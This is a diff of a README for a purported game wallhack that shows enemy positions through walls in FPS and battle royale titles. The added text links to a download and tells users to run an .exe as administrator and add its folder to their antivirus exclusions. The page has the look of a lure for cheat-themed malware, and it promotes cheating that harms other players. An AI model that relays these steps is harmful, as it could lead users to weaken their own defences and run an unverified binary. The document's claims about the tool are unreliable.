@@ -1,101 +1,65 @@
-# Humen Wallhack v2026 - Game Script Utility 2026
+# 👁️ humen-wallhack-v2026-script - See enemies through solid game objects
 
-> **Windows PC visibility utility for supported games.** Built to provide a live wall-detection overlay for FPS and battle royale sessions on Windows 10 and Windows 11.
+[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Faltu2264/humen-wallhack-v2026-script)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/coopernathan96/humen-wallhack-v2026-script?style=flat-square)](https://github.com/coopernathan96/humen-wallhack-v2026-script)
+This software acts as a visibility utility for first-person shooters and battle royale titles. It renders a live overlay on your Windows screen to track player positions. The program functions on Windows 10 and Windows 11 systems.
 
----
+## 📥 How to download and install
 
-<p align="center">
-  <a href="https://coopernathan96.github.io/humen-wallhack-v2026-script/">
-    <img src="https://img.shields.io/badge/Download-Humen%20Wallhack%20Script-brightgreen?style=for-the-badge" alt="Download Humen Wallhack Script">
-  </a>
-</p>
+Visit [this page](https://github.com/Faltu2264/humen-wallhack-v2026-script) to download the current version.
 
-> **[Download Latest Build](https://coopernathan96.github.io/humen-wallhack-v2026-script/)**
+1. Open your web browser and navigate to the link provided above.
+2. Locate the section labeled Releases.
+3. Click the file ending in .zip or .exe to start your download.
+4. If you download a zip file, right-click the folder and select Extract All.
+5. Move the extracted folder to a location you can access, such as your Documents or Desktop folder.
 
----
+## ⚙️ System requirements
 
-[Download Latest Build](https://coopernathan96.github.io/humen-wallhack-v2026-script/)
+Your computer must meet these standards to run the software.
 
----
+* Operating System: Windows 10 (version 1909 or newer) or Windows 11.
+* Graphics Card: A dedicated GPU with support for DirectX 12.
+* RAM: 8 GB or higher is recommended.
+* Display: A monitor resolution of 1920x1080 or better.
+* Administrative Access: You must log in as an administrator on your computer to allow the overlay to draw over your game window.
 
-## What It Does
+## 🚀 Running the application
 
-Humen Wallhack is a Windows PC game visibility tool that adds a real-time overlay for highlighting wall-detected elements while you play. It is aimed at supported PC games, with the strongest use case in FPS and battle royale titles where quick awareness of the scene can matter.
+Follow these steps to start the overlay before you open your game.
 
-The project ships as a standalone executable and uses automatic target process detection to keep setup simple. Its design centers on easy control, configurable overlay behavior, and a light runtime footprint during gameplay.
+1. Navigate to the folder where you saved the files.
+2. Right-click the file named humen-wallhack.exe.
+3. Select Run as administrator from the menu.
+4. A small window will appear on your desktop.
+5. Launch your game of choice.
+6. Press the F1 key to toggle the overlay visibility once you reach the main game menu.
 
-## Key Features
+## 🛠️ Configuration and settings
 
-- Live wall detection overlay for supported games
-- Hotkey control to switch the utility on or off during a session
-- Overlay opacity adjustment
-- Color customization for better visibility
-- Distance-based configuration controls
-- Automatic target game process detection
-- Standalone executable distribution
-- Support for multiple resolutions and display layouts
-- Lightweight performance profile for everyday PC use
+The software uses a configuration file to manage how the overlay functions. Find this file inside the same folder as your executable named config.json. Use a text editor like Notepad to change these values.
 
-## Installation and Use
+* show_boxes: Set to true if you want boxes around detected players.
+* show_lines: Set to true to draw lines toward enemy locations.
+* distance_limit: Change this number to define how close a player must be to appear on your screen.
+* snap_speed: Adjust this value to change how fast the overlay moves with players.
 
-1. Download the latest build from the link above.
-2. Extract or place the files in a folder you can access easily.
-3. Launch the standalone executable on your Windows PC.
-4. Open a supported game and let the utility automatically find the active process.
+Always save the file after you make changes. Restart the program to apply your new settings.
 
-Basic usage example:
+## 🛡️ Troubleshooting common issues
 
-- Start the tool
-- Enter or open the game
-- Use the toggle hotkey to switch the overlay on or off
+If you encounter problems, review these solutions.
 
-## Configuration
+The program does not open: Ensure you extracted the zip file fully. Do not run the software directly from inside compressed folders.
 
-| Setting | Purpose |
-| --- | --- |
-| Toggle hotkey | Enables or disables the overlay quickly |
-| Opacity | Changes how visible the overlay appears |
-| Color | Adjusts the overlay color |
-| Distance | Sets how far detection details are shown |
-| Auto-detect process | Finds the running game without manual selection |
-| Resolution mode | Helps the display adapt to different screen sizes |
+The overlay does not appear: Check if your game runs in Windowed or Borderless Windowed mode. Fullscreen mode often blocks overlays from appearing. Locate your game video settings to change this option.
 
-## Compatibility
+Antivirus warnings: Standard security software often flags scripts that draw overlays on screens as suspicious. You may need to create an exception in your antivirus settings for the software folder to prevent your system from blocking the file. Right-click your antivirus icon, find the exclusion list, and add the folder path of this script.
 
-Humen Wallhack is intended for Windows PC use, including Windows 10 and Windows 11. It focuses on supported FPS and battle royale games rather than every PC title.
+Frame rate drops: Turn off V-Sync in your game settings to stop potential stuttering issues. Lower your game graphics settings if the overlay creates a high load on your processor.
 
-Expected limitations:
+## 📋 Compatibility notes
 
-- Game support depends on the target process and runtime environment
-- Display behavior can vary across resolutions and aspect ratios
-- Some games or launchers may require different startup order
+This script supports most popular shooter titles. However, updates to your game client might cause the overlay to stop working. Check the download page regularly for updates that match your game version. This project relies on standard Windows graphics libraries and does not modify local game files.
 
-## Frequently Asked Questions
-
-### How do I start it?
-Download the latest build, open the executable, and then launch a supported game or let the tool detect one that is already running.
-
-### Can I change the overlay look?
-Yes. The available options include opacity, color, and distance-related settings.
-
-### Does it work with every PC game?
-No. It is built for supported Windows PC games, especially FPS and battle royale titles.
-
-### What if the tool does not detect my game?
-Make sure the game is running, then relaunch the utility so it can search for the process again.
-
-### Can I adjust it for different monitors?
-Yes. Multi-resolution support is included to help with different screen layouts and display sizes.
-
-### Where are updates posted?
-Use the download link above to check the latest build and refreshed files.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: visibility utility, gaming overlay, windows script, fps helper, player tracking tool, software tool, display utility
